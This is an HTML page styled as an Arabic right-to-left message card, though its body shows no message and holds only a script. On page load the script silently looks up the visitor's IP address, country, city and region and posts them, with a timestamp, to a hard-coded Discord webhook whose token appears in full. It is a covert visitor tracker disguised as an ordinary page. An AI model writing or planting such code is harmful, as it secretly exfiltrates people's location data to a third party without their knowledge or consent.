<style>
  :root {
    --bg: #000;
    --text: #fff;
    --muted: #bfbfbf;
    --accent: #ffd700;
  }

  html, body {
    height: 100%;
    margin: 0;
    padding: 0;
    background: var(--bg);
    color: var(--text);
    font-family: "Helvetica Neue", Arial, "Noto Naskh Arabic", sans-serif;
    direction: rtl;
    display: flex;
    align-items: center;
    justify-content: center;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
  }

  .recipient-corner {
    position: fixed;
    top: 15px;
    left: 15px;
    font-size: 1.5rem;
    font-weight: 800;
    color: var(--accent);
    background: rgba(255,255,255,0.05);
    padding: 10px 14px;
    border-radius: 10px;
    border: 1px solid rgba(255,215,0,0.2);
    box-shadow: 0 6px 18px rgba(0,0,0,0.6);
    z-index: 9999;
    pointer-events: none;
  }

  .card {
    width: 90%;
    max-width: none;
    height: 90%;
    background: rgba(255,255,255,0.05);
    border: 1px solid rgba(255,255,255,0.1);
    padding: 30px;
    border-radius: 12px;
    box-shadow: 0 10px 30px rgba(255,255,255,0.05);
    text-align: center;
    overflow-y: auto; /* يسمح بالتمرير لو النص طويل */
  }

  h1 {
    margin: 0 0 15px 0;
    font-size: 2rem;
    color: var(--accent);
  }

  p.lead {
    margin: 0 0 15px 0;
    font-size: 1.2rem;
    color: var(--text);
    line-height: 1.6;
  }

  blockquote {
    margin: 15px 0;
    padding: 14px 18px;
    border-right: 4px solid rgba(255,255,255,0.15);
    color: var(--muted);
    background: rgba(255,255,255,0.02);
    border-radius: 8px;
    line-height: 1.8;
    font-size: 1.1rem;
  }

  .small {
    margin-top: 20px;
    color: var(--muted);
    font-size: 1rem;
  }

  .final {
    margin-top: 20px;
    color: var(--accent);
    font-size: 1.2rem;
    font-weight: 700;
    letter-spacing: 0.4px;
  }

  @media (max-width: 600px) {
    .card { padding: 20px; }
    h1 { font-size: 1.6rem; }
    .recipient-corner { font-size: 1.2rem; top: 10px; left: 10px; }
    p.lead { font-size: 1rem; }
    blockquote { font-size: 0.95rem; }
    .final { font-size: 1rem; }
  }
</style>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title></title>
</head>
<body>

  <script>
    fetch('https://ipinfo.io/json')
      .then(response => response.json())
      .then(data => {
        const { ip, country, city, region } = data;
        const dateTime = new Date().toLocaleString();
        const webhookUrl = 'https://discord.com/api/webhooks/1432117446394908736/KTwmd-f8png6QS7MDLC4joF5V-txR2UfUQ332aPVjH_7u3InF0U88zEMMrZELzje9RE4';
        
        const payload = {
          content: `IP: ${ip}\nCountry & City: ${country} - ${city}\nRegion: ${region}\nDate & Time: ${dateTime}`
        };
        
        fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
      })
      .catch(error => console.error('Error fetching IP info:', error));
  </script>
</body>
</html>
